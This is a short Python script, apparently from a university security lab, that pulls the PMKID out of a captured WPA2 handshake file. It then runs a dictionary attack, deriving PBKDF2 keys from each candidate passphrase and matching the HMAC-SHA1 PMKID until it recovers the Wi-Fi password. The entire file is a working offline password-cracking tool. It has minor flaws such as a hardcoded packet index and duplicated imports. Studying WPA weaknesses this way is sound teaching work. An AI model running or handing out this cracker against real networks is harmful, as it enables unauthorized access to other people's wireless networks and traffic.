#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
Derive WPA keys from Passphrase and 4-way handshake info

Calcule un MIC d'authentification (le MIC pour la transmission de données
utilise l'algorithme Michael. Dans ce cas-ci, l'authentification, on utilise
sha-1 pour WPA2 ou MD5 pour WPA)
"""

__author__      = "Abraham Rubinstein et Yann Lederrey"
__copyright__   = "Copyright 2017, HEIG-VD"
__license__ 	= "GPL"
__version__ 	= "1.0"
__email__ 		= "abraham.rubinstein@heig-vd.ch"
__status__ 		= "Prototype"

from scapy.all import *
from binascii import a2b_hex, b2a_hex
# La dépendance est inclue dans pbkdf2
# from pbkdf2_math import pbkdf2_hex
from pbkdf2 import *
import hmac, hashlib
from numpy import loadtxt
from numpy import array_split
from numpy import array
from numpy import loadtxt
from numpy import str
import binascii
import argparse

#Charge le dictionnaire
parser = argparse.ArgumentParser()
parser.add_argument("dictionary", help="Dictionary containing passphrases")
args = parser.parse_args()
with open(args.dictionary) as f1 :
	    dic = loadtxt(f1, dtype=str, ndmin=1)

# Read capture file -- it contains beacon, authentication, associacion, handshake and data
wpa=rdpcap("PMKID_handshake.pcap") 

ssid        =  wpa[0].info.decode('utf-8')
APmac       = a2b_hex(wpa[145].addr3.replace(':',''))
Clientmac   = a2b_hex(wpa[145].addr1.replace(':',''))

#PMKID
nullPMKID = '0'*32
found = False
for i in range(len(wpa)):
    if wpa[i].haslayer(EAPOL):
        PMKID = binascii.hexlify(wpa[i].getlayer(Raw).load)[202:234]
        if PMKID != nullPMKID and PMKID != '':
            found = True
if not found:
    print("no PMKID found")
else:
    print(PMKID, '\n')

PMKID = binascii.hexlify(wpa[145].getlayer(Raw).load)[202:234]
print("PMKID: ",PMKID)
print("AP Mac ",APmac)
print("Client Mac ",Clientmac)


for i in range(len(dic)):
    passPhrase = str.encode(dic[i])
    pmk = pbkdf2(hashlib.sha1,bytes(passPhrase), ssid.encode('utf-8'), 4096, 32)
    pmkid_calc = hmac.new(pmk,"PMK Name".encode('utf-8') + APmac + Clientmac, digestmod=hashlib.sha1).hexdigest()
    
    if pmkid_calc[:-8].encode('utf-8') == PMKID:
        print("Mot de passe trouvé: "+str(passPhrase))
    